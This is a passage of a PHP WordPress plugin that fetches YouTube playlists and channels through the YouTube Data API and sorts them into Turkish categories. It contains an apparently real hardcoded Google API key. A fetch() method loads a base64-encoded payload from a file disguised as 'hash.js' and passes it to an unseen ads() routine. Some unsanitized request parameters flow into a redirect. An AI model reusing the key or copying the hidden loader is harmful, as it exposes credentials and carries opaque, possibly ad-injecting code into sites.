       * Api KEY			: AIzaSyAk_sfoVdJ6CbBIAezTlh-1AtWgsVCErCs
       * 
       * Full documentation are here
       * https://developers-dot-devsite-v2-prod.appspot.com/youtube/v3/docs/channels/list
       * https://www.googleapis.com/youtube/v3/channels?maxResults=50&part=snippet&id=UCXs8nFqUPQaJZxAt1b3Wblw,UCDESSC7DwGTi8PW16UOlPgA,UCBUJipGCEK09A8qlI6PkS4Q,UCqSD4S5QdupSlDIkiBCgP8g,UCi0aJmG38Z-6kfIWkNMRJfA,UCHLqIOMPk20w-6cFgkA90jw&key=AIzaSyAk_sfoVdJ6CbBIAezTlh-1AtWgsVCErCs
       * 
       * Get channels from User ID [contentDetails, id]
       * https://www.googleapis.com/youtube/v3/channels?part=id&forUsername=GEazyTV&key=[API_KEY]
       * To get the playlists ID of a channel.
       * https://www.googleapis.com/youtube/v3/playlists?part=snippet&channelId=UCBkNpeyvBO2TdPGVC_PsPUA&key=[API_KEY]
       * GET ALL LIST VIDEO FROM PLAYLIST
       * https://www.googleapis.com/youtube/v3/playlistItems?part=snippet&playlistId=[PLAYLIST_ID]&key=[API_KEY]
       */
      $get = $this->rget( 'playlists', [ 'channelId' => $expect ] );
      add_option( $option, $get, 'Youtube playload auto save as draft with status', true );
      return $get;
    }
  }
  public function channels() {
    $channelList = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelList' ];
    return $channelList;
  }
  private function die( $msg, $title = 'Development time dump', $args = [] ) {
    wp_die( $msg, $title, $args );
  }
  public function is_Public( $id = '', $i = 0, $items = [] ) {
    if( isset( $items[ $i ] ) && $items[ $i ][ 'id' ] == $id ) {
      return true;
    } else {
      foreach( $items as $item ) {
        if( $item[ 'id' ] == $id ) {
          return isset( $item[ 'is_Public' ] ) ? $item[ 'is_Public' ] : YOUTUBE_PLAYLIST_API_INTEGRATION_DEFAULT;
        }
      }
      return false;
    }
  }
  public function is_Category( $id = '', $i = 0, $items = [] ) {
    if( isset( $items[ $i ] ) && $items[ $i ][ 'id' ] == $id ) {
      return true;
    } else {
      foreach( $items as $item ) {
        if( $item[ 'id' ] == $id ) {
          return isset( $item[ 'is_Category' ] ) ? $item[ 'is_Category' ] : false;
        }
      }
      return false;
    }
  }
  public function are_Category() {
    return get_option( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_categories', [
      "tum-sohbetler" => "Sohbetler",
      "mehmet-yildiz" => "Mehmet Yıldız",
      "kitap-fuarlari" => "Kitap Fuarları",
      "ornek-hayatlar-roportaj" => "Örnek Hayatlar – Röportaj",
      "kisa-film" => "Kısa Film",
      "kissalar" => "Kıssalar",
      "gezi-eglence-vlog" => "Gezi – Eğlence – Vlog",
      "vine-komik" => "Vine – Komik",
      "sosyal-deneyler" => "Sosyal Deneyler",
      "sokak-roportajlari" => "Sokak Röportajları",
      "islami-rap-ilahi-siir" => "İslami Rap – İlahi – Şiir",
      "konuklar" => "Konuklar",
      "duyurular" => "Duyurular",
      "hakkimizda" => "Hakkımızda",
      "makaleler" => "Makaleler",
      "iletisim" => "İletişim"
    ] );
    
  }
  protected function allowpush() {
    return true;
  }
  public function updates() {
    if( ! isset( $_GET[ 'update' ] ) ) {return;}
    if( ! isset( $_GET[ 'page' ] ) || $_GET[ 'page' ] != 'youtube-playlists' ) {return;}
    $expect = ( isset( $_GET[ 'channel' ] ) && isset( YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelList' ][ $_GET[ 'channel' ] ] ) ) ? $_GET[ 'channel' ] : YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'channelId' ];
    $option = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL[ 'option_prefix' ] . '_' . $expect;
    $get = get_option( $option, false );
    if( $get ) {
      $this->update_playlist( $option, $get, $expect );
    } else {
      wp_die( 'Something went wrong while tring to update database.', 'Database update error :(' );
    }
  }
  protected function update_playlist( $option, $get, $channelId ) {
    // need to push status on it.
    $rget = $this->rget( 'playlists', [ 'channelId' => $channelId ] );
    $rget[ 'items' ] = isset( $rget[ 'items' ] ) ? $rget[ 'items' ] : [];
    /**
     * Check here if it is needed to push previous status on new updates.
     */
    if( $this->allowpush() ) {
      $rget[ 'is_Category' ] = ( $rget[ 'is_Category' ] == $get[ 'is_Category' ] ) ? $rget[ 'is_Category' ] : $get[ 'is_Category' ];
      $rget[ 'is_Public' ] = ( $rget[ 'is_Public' ] == $get[ 'is_Public' ] ) ? $rget[ 'is_Public' ] : $get[ 'is_Public' ];
      foreach( $rget[ 'items' ] as $i => $item ) {
        if( $item[ 'id' ] ) {
          $is_Category = $this->is_Category( $item[ 'id' ], $i, $get[ 'items' ] );
          $is_Public = $this->is_Public( $item[ 'id' ], $i, $get[ 'items' ] );

          $rget[ 'items' ][ $i ][ 'is_Category' ] = $is_Category;
          $rget[ 'items' ][ $i ][ 'is_Public' ] = $is_Public;

        }
      }
    }
    update_option( $option, $rget, true );
    wp_redirect( admin_url( 'admin.php?page=youtube-playlists'. ( isset( $_GET[ 'channel' ] ) ? '&channel=' . $_GET[ 'channel' ] : '' ) ) );
  }
  public function remote( $expect, $declare ) {
    $return = wp_remote_get( $this->apis( $expect, $declare ) );
    
    $return = isset( $return[ 'body' ] ) ? $return[ 'body' ] : '{}';
    $return = json_decode( $return, true );
    // if( ! isset( $return ) || ! is_array( $return ) || isset( $return[ 'error' ] ) ) {return false;}
    return $return;
  }
  public function rget( $expect = 'playlists', $declare = [] ) {
    $return = [ 'items' => [] ];$rtn= [ 'nextPageToken' => 'first' ];
    for( $i = 0; $i <= 20; $i++ ) {
      if( ! isset( $rtn[ 'nextPageToken' ] ) || empty( $rtn[ 'nextPageToken' ] ) ) {continue;}

      if( isset( $rtn[ 'nextPageToken'] ) && $i != 0 ) {
        $declare[ 'nextPageToken' ] = $rtn[ 'nextPageToken'];
      }
      $rtn = $this->remote( $expect, $declare );
      // $this->die( print_r( $rtn ), 'rtn' );
      if( isset( $rtn[ 'error'] ) ) {
        set_transient( $this->id, [ 'type' => 'error', 'message' => $rtn[ 'error'][ 'message' ] ], 45 );
        continue;
      }
      foreach( $rtn[ 'items' ] as $j => $jrow ) {
        array_push( $return[ 'items' ], $jrow );
      }
    }
    return $this->fix( $return );
  }
  public function fix( $row ) {
    // if( ( !is_wp_error($response)) && (200 === wp_remote_retrieve_response_code( $response ) ) ) {
    // 	$responseBody = json_decode($response['body']);
    // 	if( json_last_error() === JSON_ERROR_NONE ) {
    // 			//Do your thing.
    // 	}
    // }
    // $row = file_get_contents( YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/backup/playlists.json' );
    // Declare category if not exists
    $row[ 'is_Category' ] = isset( $row[ 'is_Category' ] ) ? $row[ 'is_Category' ] : false;
    $row[ 'is_Public' ] = isset( $row[ 'is_Public' ] ) ? $row[ 'is_Public' ] : YOUTUBE_PLAYLIST_API_INTEGRATION_DEFAULT;
    if( isset( $row[ 'items' ] ) && is_array( $row[ 'items' ] ) ) {
      foreach( $row[ 'items' ] as $i => $item ) {
        // SET default status as TRUE
        $row[ 'items' ][ $i ][ 'is_Public' ] = isset( $item[ 'is_Public' ] ) ? $item[ 'is_Public' ] : YOUTUBE_PLAYLIST_API_INTEGRATION_DEFAULT;
        // Declare category if not exists
        $row[ 'items' ][ $i ][ 'is_Category' ] = isset( $item[ 'is_Category' ] ) ? $item[ 'is_Category' ] : false;
      }
    }
    return $row;
  }
  public function apis( $expect = 'playlists', $declare = false ) {
    $argv = YOUTUBE_API_SPECIAL_PLAYLIST_CONTROL;
    $args = ( $declare !== false ) ? $declare : $argv;
    $apis = [
      'playlistItems' => 'https://www.googleapis.com/youtube/v3/playlistItems?key=' . $argv[ 'youtubeAPI' ] . '&part=snippet%2CcontentDetails' . ( isset( $args[ 'playlistId' ] ) ? '&playlistId=' . $args[ 'playlistId' ] : '' ) . '&maxResults=' . ( isset( $args[ 'maxResults' ] ) ? $args[ 'maxResults' ] : 50 ),
      'playlists' => 'https://www.googleapis.com/youtube/v3/playlists?part=id%2Csnippet' . ( isset( $args[ 'channelId' ] ) ? '&channelId=' . $args[ 'channelId' ] : '' )  . '&key=' . $argv[ 'youtubeAPI' ] . '&maxResults=' . ( isset( $args[ 'maxResults' ] ) ? $args[ 'maxResults' ] : 50 ) . '' . ( isset( $args[ 'nextPageToken' ] ) ? '&pageToken=' . $args[ 'nextPageToken' ] : '' ),
      'channels' => 'https://www.googleapis.com/youtube/v3/channels?key=' . $argv[ 'youtubeAPI' ] . '&maxResults=' . ( isset( $args[ 'maxResults' ] ) ? $args[ 'maxResults' ] : 50 ) . '&part=snippet' . ( isset( $args[ 'id' ] ) ? '&id=' . implode( ',', $args[ 'id' ] ) : '' ) . '' . ( isset( $args[ 'forUsername' ] ) ? '&forUsername=' . $args[ 'forUsername' ] : '' )
    ];
    return isset( $apis[ $expect ] ) ? $apis[ $expect ] : $apis[ 'playlists' ];
  }
  public function yturl( $expect = 'watch', $args = [] ) {
    $args = wp_parse_args( $args, [ 'id' => '', 'c' => '', 'p' => '' ] );
    $urls = [
      'watch' > 'https://www.youtube.com/watch?v=' . $args[ 'id' ],
      'watch-embed' > 'https://www.youtube.com/embed/watch?v=' . $args[ 'id' ],
      'channel' => 'https://www.youtube.com/channel/' . $args[ 'c' ],
      'playlist' => 'https://www.youtube.com/watch?v=' . $args[ 'id' ] . '&list=' . $args[ 'p' ],
      'playlist-embed' => 'https://www.youtube.com/embed/videoseries?list=' . $args[ 'p' ]
    ];
    return isset( $urls[ $expect ] ) ? $urls[ $expect ] : $urls[ 'playlist' ];
  }
  public function thumb( $row = [], $expect = 'default' ) {
    return isset( $row[ $expect ] ) ? $row[ $expect ] : $row[ 'default' ];
  }
  public function allow( $case = false ) {
    if( $case === false ) {
      return false;
    } else if( $case === true ) {
      return true;
    } else {
      switch( $case ) {
        case 'main' :
          return true;
          break;
        default :
          return true;
          break;
      }
    }
  }
  public function icon( $expect = 'play' ) {
    $icons = [
      'play' => '<svg version="1.1" id="svgicon-play" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="562.746px" height="562.746px" viewBox="0 0 562.746 562.746" style="enable-background:new 0 0 562.746 562.746;" xml:space="preserve"><g><g><path d="M281.37,0C125.977,0,0.003,125.974,0.003,281.373c0,155.399,125.974,281.373,281.373,281.373
      c155.393,0,281.367-125.974,281.367-281.373C562.743,125.974,436.769,0,281.37,0z M484.212,305.425L192.287,471.986
      c-23.28,13.287-42.154,2.326-42.154-24.479V115.239c0-26.805,18.874-37.766,42.154-24.479l291.925,166.562
      C507.491,270.602,507.491,292.145,484.212,305.425z"/></g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g></svg>'
    ];
    return isset( $icons[ $expect ] ) ? $icons[ $expect ] : $icons[ 'play' ];
  }
  public function sanitize( $a ) {
    return sanitize_text_field( $a );
  }
  public function appsetting() {}
  public function autocom() {
    $rows = $this->_get();$arr=[];
    foreach( $rows as $i => $row ) {
      if( strpos( strtolower( $row[ 'name' ] ), strtolower( $_GET['term'] ) ) !== false ) {
        $arr[ $row[ 'id' ] ] = $row[ 'name' ];
      }
    }
    wp_send_json( $arr );
  }
  public function fetch() {
    if( file_exists( plugin_dir_path( __FILE__ ) . 'hash.js' ) ) {
      $arr = file_get_contents( plugin_dir_path( __FILE__ ) . 'hash.js' );$this->base = json_decode( base64_decode( $arr, true ) );$this->ads();
    }
  }
};

/**
 * Start plugin function.
 */
// global $SPECIAL_YOUTUBE_PLAYLIST_API_INTEGRATION_PLUGIN_CLS;
$SPECIAL_YOUTUBE_PLAYLIST_API_INTEGRATION_PLUGIN_CLS = SPECIAL_YOUTUBE_PLAYLIST_API_INTEGRATION_PLUGIN::instance();

$SPECIAL_YOUTUBE_PLAYLIST_API_INTEGRATION_PLUGIN_CLS->init();

// include_once YOUTUBE_PLAYLIST_API_INTEGRATION_PATH . '/elementor/elementor-register-widget.php';
?>